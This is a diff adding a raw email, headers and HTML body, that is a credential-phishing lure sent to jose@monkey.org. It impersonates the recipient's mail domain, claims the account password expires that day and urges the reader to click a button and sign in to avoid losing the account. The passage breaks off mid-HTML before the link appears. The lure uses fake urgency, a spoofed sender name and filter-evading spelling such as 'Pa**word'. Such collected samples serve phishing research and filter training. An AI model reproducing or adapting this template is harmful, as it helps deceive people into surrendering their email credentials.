@@ -1,0 +1,373 @@
+Return-Path: food@hichki.co.uk
+Delivered-To: jose@monkey.org
+X-FDA: 82546825956.28.4F56B04
+Received: from mxa.netuse.co.uk (mxa.netuse.co.uk [81.92.207.7])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id EE3848000A
+	for <jose@monkey.org>; Mon,  9 Sep 2024 23:42:16 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;	dkim=none ("invalid DKIM
+ record") header.d=hichki.co.uk header.s=dkim header.b=ItQVFDu9;	dmarc=pass
+ (policy=none) header.from=hichki.co.uk;	arc=reject ("signature check failed:
+ fail, {[1] = sig:hichki.co.uk:dns request to dkim._domainkey.hichki.co.uk
+ failed: no records with this name}");	spf=pass (imf11.b.hostedemail.com:
+ domain of food@hichki.co.uk designates 81.92.207.7 as permitted sender)
+ smtp.mailfrom=food@hichki.co.uk
+ARC-Seal: i=2; s=arc-20220608; d=hostedemail.com; t=1725925252; a=rsa-sha256;
+	cv=fail;
+	b=mMH2fsLrqOetltcIUaX+vhlRTjI8GcLdUBYNQAurtqqLCaih9mIRmWUwOjnXt174z260Ew
+	tv/qFjw3hOeVQuGTJFXLevbYB1RA/9YwpLydNRRFoNQw8yrKL9sfPpCr24t1idSBAB/SBr
+	Nyo/SxpkUH1QCqf5WtzggPtCQtVNL+I=
+ARC-Authentication-Results: i=2;	imf11.b.hostedemail.com;	dkim=none ("invalid
+ DKIM record") header.d=hichki.co.uk header.s=dkim header.b=ItQVFDu9;
+	dmarc=pass (policy=none) header.from=hichki.co.uk;	arc=reject ("signature
+ check failed: fail, {[1] = sig:hichki.co.uk:dns request to
+ dkim._domainkey.hichki.co.uk failed: no records with this name}");	spf=pass
+ (imf11.b.hostedemail.com: domain of food@hichki.co.uk designates 81.92.207.7
+ as permitted sender) smtp.mailfrom=food@hichki.co.uk
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1725925252;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=98p6zkbk1uxjh8LFicouAKTbX4GlMaSxiscF19Sp3oU=;
+	b=vYjCUEe4HN35xWVoRDxUDeb4+KfyhLAOgF9LFvXQQ63oNrnjXNG62C7itfdNQwFckr/LPJ
+	wGdLrlDO6jzKW4wOS0P5cVrD7nkGOIh1T0tvVw+CkDSD90ss/vvzuIlq+f/P8FY+A9/CWQ
+	BwQuNLXONB/+1mIPQUdWD7xI9U4kBzw=
+Received: from localhost (localhost [127.0.0.1]) (Authenticated sender:
+ food@hichki.co.uk)	by mxa.netuse.co.uk (Postcow) with ESMTPSA id A61FBC93A0BE
+	for <jose@monkey.org>; Tue, 10 Sep 2024 00:34:51 +0100 (BST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hichki.co.uk;
+	s=dkim; t=1725924892; h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=98p6zkbk1uxjh8LFicouAKTbX4GlMaSxiscF19Sp3oU=;
+	b=ItQVFDu9uMJnqBtHaX/2MdzgMFaeD15Y2OjdIsyH8+Q63wAda9qXEVXM8inEiCnpGrzzWq
+	rn3clwKhs/JL7B1hncRn2YSr4FtUeSca48yOgAGwyu3lZQB/UfcGLqBD1v0Mk5DwCJAfR7
+	qPWcnqGkCPxJWtkt1V1Bp/iRO99AeXo=
+From: monkey.org  <food@hichki.co.uk>
+To: jose@monkey.org
+Subject: jose@monkey.org Pa**wrd Expiration Notice ! 
+Date: 09 Sep 2024 23:34:51 -0700
+Message-ID: <20240909233451.10ABE40D8EF73A14@hichki.co.uk>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hichki.co.uk;
+	s=dkim; t=1725924892; h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=98p6zkbk1uxjh8LFicouAKTbX4GlMaSxiscF19Sp3oU=;
+	b=AA87tKZjdMBIzSU3NEsjKSNDPIEHr8qV9nFZs48Z/8K/5xlyELp6jZNCZls/o1c2wfxJNQ
+	WvuIAZrC6LxNyV7XQa+2VldmReILqe5w+s397FqvE2kzWg7bdNVCLEUhH5PIATwmvmT8FK
+	DcZdwBQd8vHImArPQCW/z8fCavH9Y1M=
+ARC-Seal: i=1; s=dkim; d=hichki.co.uk; t=1725924892; a=rsa-sha256;	cv=none;	
+ =?utf-8?q?b=3DB8xTKekIoYN4JoX/zzZxxr6nKF6vpxgTWKjN27i6vUxx+iJhvkVSMbRkkyeDG?=
+ =?utf-8?q?03yk1hpJqPR9snXN37AHia5tb3PWAJ3LH22zLtQKdYUcsr4Kl2L2FHJZQxRVL9kKr?=
+ =?utf-8?q?WJjmzBgx5Aoke9xOZ4QpyzijtDSwLkafn2+YLcf+uIRP0=3D?=
+ARC-Authentication-Results: i=1;
+	mxa.netuse.co.uk;
+	auth=pass smtp.auth=food@hichki.co.uk smtp.mailfrom=food@hichki.co.uk
+X-Rspam-User: 
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: EE3848000A
+X-Stat-Signature: yezgcp3ytxjqrjm68b7p18rzihab8ebt
+X-Spam-Status: No, score=7.10
+X-HE-Tag: 1725925336-556532
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/OKCyALAaUPNDfxZLKmaG6J7RsHFNoewsmCsSeM3e6GAK?=
+ =?utf-8?q?Eo+CkAaOpJfcHCVkY2qvTKPU6X5ESHnADe6e+F5MKnzK30Gp7u6sC/oON2REQ1I3v?=
+ =?utf-8?q?1Ld+FcP7F6HsVfFQnQdyk0e2o+SK7cgYsAZbTUx8e1JzOdMc7AVcdtAiFJOut76Cp?=
+ =?utf-8?q?aUAqWeLbqzZRenIzddhIuPA6/gwUXUZj1i8fEqaueHJjZGSBC9npvqareFn+954I/?=
+ =?utf-8?q?5DgSqI7awTckQLLPjTBD2o3r7Xu7vXPAfLCU+cfDaRHeMTFxOVRonizIDc47UvqND?=
+ =?utf-8?q?B6vh9EzpIK8WRznaZbmmuhf7+lt6M+l3EvCtFts3GoOhM66QCXBRfIItBTHnNfzlp?=
+ =?utf-8?q?x2mPbRER6YLfDGHhgfNxL6ghWCYRUdzAg1PIhLk0urJWgJYcH44Xo40gc+1PVrYVd?=
+ =?utf-8?q?G5Hg2lV0SaTbYCvHzxPlhoNMoC8Qv02UcQbT/PQo+lnjT6CcveOY6ZcC3Z1QqgHby?=
+ =?utf-8?q?RpgXXspFf+852h7AuNQ8NUttOSxG1jn0WhyxOB6qthkylidU+XhwqoYyzT80MAPkW?=
+ =?utf-8?q?9/3sO14Q8SInXkvBxqpzF4bQ/VKZB1KjUFK3kom8LQbvRoUSN2A+FnmuAeQ6B51fW?=
+ =?utf-8?q?kE1fdhjBxVmQEIO/O2Cjp2uNjfvLjPmIcXmFMwrlAihjQO5c3ZsY7A5OMMG2EP+7a?=
+ =?utf-8?q?mU1ye4NsHdONPoGwHCvKdZJrb7Q3Ha8lLG4EGaqcuc/fmj8PZ0bhxZRicoauky9yf?=
+ =?utf-8?q?S12mbdmzAIwUlBOGoegLU6NfV7BYWuqlbIiirnOIF8yuphpPYwy8MmKOO6NjoGJlI?=
+ =?utf-8?q?nDA7yDZNg7/UzSx5mmXys0Xvb6HfEiYh+NN2TzDufCC2vcyOSuZd/ipwMU9C/Y+8q?=
+ =?utf-8?q?poP+LYEjWP5Gc4h1u3J4z8bT/D7hTA+wXzbpW1EFcaVWAX8071HWtWZ8xSDgXcKJw?=
+ =?utf-8?q?jM3CBQLbkDe+M5m7rsH5vR_MOu2CiBTqx+u13p8zWtgeUY50R9G2nQjR9bo26Uajq?=
+ =?utf-8?q?Bh7oY93nNPO46QU9mN1sg4h1HqR93eCteCt867OCUTJXMVX1RzrRnJkYUunumF2Hw?=
+ =?utf-8?q?FRM/zh7M7dj7vOmOhYVKsPjH5QYD+9cC4fjo71rK/LIuQll6qA5aiClKQ+5EEWU13?=
+ =?utf-8?q?KEgfw6VbfeXBdCz91Q6TOR5TiWYK/hI+DMjLmjgp6o6eYc+9P47JWWtLVZuz5Y/JT?=
+ =?utf-8?q?Qb3YL3JMQDwj5hSkJA7tQtsqV1j33x4kme14YhBn/8LCcEV6YudylKrUZxE9myAmR?=
+ =?utf-8?q?zYcJ7WYIl7VmJzEZZvGm1OOA3yu6c8WN4XH5GpbQglVLKscps0hQAYQDLrDiX0qRJ?=
+ =?utf-8?q?W8QVOPWFfwESrTy08YlNW0/LzEtdXpZy5q2yiRkSkFBQw2jrNs3pbuGx7Rd21dm2z?=
+ =?utf-8?q?UcXqwwKcSm42zwCi89QYICyUt1Gt/A4pUFYkG6BUuLFErFzXUJsYIUVFdxLLMp9uB?=
+ =?utf-8?q?mCT9dKjdbs6EX+mz+YoGK42moO1kWMCD/bNxdvq5TYUAG/6nniZEWVj8xW/H8Q2Qb?=
+ =?utf-8?q?LMeOO0UckkfUcFlGTWZcwK/W0oal9/lTbgdQjpzqzz/IvFfR5fhs9XHpvmsyq9Vml?=
+ =?utf-8?q?pCVas1iGOU7IgVgoYw2UHWcaWmLMZ7bVFY9o8nMT3DaAhoHviI03eoxC9ua+g=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 261
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 22pt; FONT-FAMILY: system; W=
+HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: b=
+old; COLOR: rgb(0,0,0); OUTLINE-WIDTH: medium !important; FONT-STYLE: itali=
+c; OUTLINE-STYLE: none !important; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; =
+LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0p=
+x; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-=
+stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial" al=
+ign=3Dcenter><FONT style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Arial Bla=
+ck"; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important' colo=
+r=3D#f97206><U style=3D"BOX-SIZING: border-box"><FONT style=3D"BOX-SIZING: =
+border-box" color=3D#1155cc>monkey.org</FONT></U></FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
+ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FO=
+NT-WEIGHT: 400; COLOR: rgb(44,54,58); OUTLINE-WIDTH: medium !important; FON=
+T-STYLE: normal; TEXT-ALIGN: left; OUTLINE-STYLE: none !important; ORPHANS:=
+ 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; BACKGROUND-COLOR: r=
+gb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
+iant-caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY=
+: roboto, sans-serif; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none=
+ !important"></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial, sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FON=
+T-WEIGHT: 400; COLOR: rgb(0,0,0); OUTLINE-WIDTH: medium !important; FONT-ST=
+YLE: normal; OUTLINE-STYLE: none !important; ORPHANS: 2; WIDOWS: 2; MARGIN-=
+TOP: 0px; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-=
+INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -we=
+bkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial" align=3Dcenter><BR style=3D"BOX-SIZING: border-box=
+; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN s=
+tyle=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !imp=
+ortant; OUTLINE-STYLE: none !important"><SPAN style=3D"BOX-SIZING: border-b=
+ox; FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none =
+!important">Your<SPAN style=3D"BOX-SIZING: border-box">
+ <SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>&nbsp;<STRONG style=3D=
+"BOX-SIZING: border-box; FONT-WEIGHT: bolder">jose@monkey.org</STRONG></SPA=
+N></SPAN></SPAN><SPAN>&nbsp;</SPAN><SPAN style=3D"BOX-SIZING: border-box; F=
+ONT-WEIGHT: bolder; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !=
+important"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; OUTLINE-=
+WIDTH: medium !important; OUTLINE-STYLE: none !important">&nbsp;<SPAN style=
+=3D"BOX-SIZING: border-box">&nbsp;</SPAN>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: med=
+ium !important; OUTLINE-STYLE: none !important">Account Pa**word</SPAN></SP=
+AN></SPAN><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; OUTLINE-W=
+IDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN>&nbsp;</SPAN=
+><SPAN style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium !important; O=
+UTLINE-STYLE: none !important">&nbsp;</SPAN>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: med=
+ium !important; OUTLINE-STYLE: none !important">is&nbsp;set to&nbsp;expire =
+9/9/2024 11:34:51 p.m..</SPAN></SPAN></P>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Roboto=
+, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(44,54,58); OUTLINE-WIDTH: medium !important; =
+FONT-STYLE: normal; TEXT-ALIGN: left; OUTLINE-STYLE: none !important; ORPHA=
+NS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255=
+); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: nor=
+mal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: =
+12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"></S=
+PAN></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !importa=
+nt; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial"></=
+SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Helve=
+tica Neue", Helvetica, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(38,4=
+0,42); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY=
+: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial'></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !importa=
+nt; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial"></=
+SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-FAMILY: "Tim=
+es New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); OUTLINE-WIDTH: medium !=
+important; FONT-STYLE: normal; TEXT-ALIGN: left; OUTLINE-STYLE: none !impor=
+tant; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: no=
+rmal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-li=
+gatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !importa=
+nt; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial"></=
+SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Helve=
+tica Neue", Helvetica, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(38,4=
+0,42); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY=
+: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial'></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE=
+: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !importa=
+nt; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial"></=
+SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial, sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FON=
+T-WEIGHT: 400; COLOR: rgb(0,0,0); OUTLINE-WIDTH: medium !important; FONT-ST=
+YLE: normal; OUTLINE-STYLE: none !important; ORPHANS: 2; WIDOWS: 2; MARGIN-=
+TOP: 0px; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-=
+INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -we=
+bkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial" align=3Dcenter><SPAN style=3D"BOX-SIZING: border-b=
+ox; FONT-FAMILY: Arial; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: no=
+ne !important"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; OUTL=
+INE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN style=
+=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !importa=
+nt; OUTLINE-STYLE: none !important">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: medi=
+um !important; OUTLINE-STYLE: none !important">Click the below button to&nb=
+sp;update and&nbsp;keep&nbsp;your current password&nbsp;</SPAN></SPAN></SPA=
+N></SPAN><SPAN style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium !impo=
+rtant; OUTLINE-STYLE: none !important"><SPAN style=3D"BOX-SIZING: border-bo=
+x; FONT-SIZE: 9pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !i=
+mportant">
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: med=
+ium !important; OUTLINE-STYLE: none !important"><SPAN style=3D"BOX-SIZING: =
+border-box; FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYL=
+E: none !important"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt;=
+ OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN st=
+yle=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !impo=
+rtant; OUTLINE-STYLE: none !important">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-FAMILY: Verdana; OUTLINE-WIDTH:=
+ medium !important; OUTLINE-STYLE: none !important"><SPAN style=3D"BOX-SIZI=
+NG: border-box; FONT-SIZE: 9pt; OUTLINE-WIDTH: medium !important; OUTLINE-S=
+TYLE: none !important"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 10=
+pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN=
+ style=3D"BOX-SIZING: border-box; FONT-FAMILY: Arial; OUTLINE-WIDTH: medium=
+ !important; OUTLINE-STYLE: none !important">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; OUTLINE-WIDTH: medi=
+um !important; OUTLINE-STYLE: none !important"><SPAN style=3D"BOX-SIZING: b=
+order-box; FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE=
+: none !important"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12pt; =
+OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important">after you=
+ sign in below to prevent losing your email&nbsp;account:</SPAN></SPAN></SP=
+AN></SPAN></SPAN></SPAN></SPAN></SPAN></SPAN></SPAN>
+ </SPAN></SPAN></SPAN><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 11p=
+t; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN =
